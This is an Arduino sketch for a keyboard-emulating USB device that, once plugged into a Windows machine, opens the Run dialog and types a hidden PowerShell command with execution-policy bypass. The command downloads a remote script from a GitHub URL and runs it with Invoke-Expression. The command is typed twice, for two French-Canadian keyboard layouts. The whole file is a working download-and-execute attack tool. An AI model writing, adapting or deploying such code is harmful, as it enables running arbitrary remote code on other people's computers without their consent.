#include <Keyboard.h>

const char payload [] = "powershell -W Minimized -Exec Bypass $a= Invoke-WebRequest https://raw.githubusercontent.com/jkljkl1197/ArduinoFun/main/FunPayload.ps1 -UseBasicParsing; Invoke-Expression $a";

void setup()
{
  // Begining the stream
  Keyboard.begin();


  // FR-CA
 
  // Waiting for 500ms 
  delay(2000);
 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
 
  delay(1000);

  //fr-ca 3 + shift = /
  //fr-cms `(en bas de esc) = /
  
  //Keyboard.write(0xA8); Keyboard.press(KEY_LEFT_SHIFT); 3 + shift
  //Keyboard.write(0xBD);

    int len = strlen(payload);
    for (int i=0;i<len;i++) {
      if(payload[i] == '/'){
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.press(0xA8); //3
        Keyboard.releaseAll();
      }
      else
      {
        Keyboard.print((char) payload[i]);
      }
      delay(5);
    }
    
  delay(1000);
 
  typeKey(KEY_RETURN);
 
  delay(5000);

  /////////////////////////////////////////////////////////////////////////////////////

  // FR-CMS

  // Waiting for 500ms 
  delay(500);
 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
 
  delay(1000);

  //fr-ca 3 + shift = /
  //fr-cms `(en bas de esc) = /
  
  //Keyboard.write(0xA8); Keyboard.press(KEY_LEFT_SHIFT); 3 + shift
  //Keyboard.write(0xBD);

    int len1 = strlen(payload);
    for (int i=0;i<len1;i++) {
      if(payload[i] == '/'){
        Keyboard.press(0xBD); // `
        Keyboard.releaseAll();
      }
      else
      {
        Keyboard.print((char) payload[i]);
      }
      delay(5);
    }
    
  delay(1000);
 
  typeKey(KEY_RETURN);
 
  delay(5000);
  
  }

 
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
 
// Unused
void loop() {}
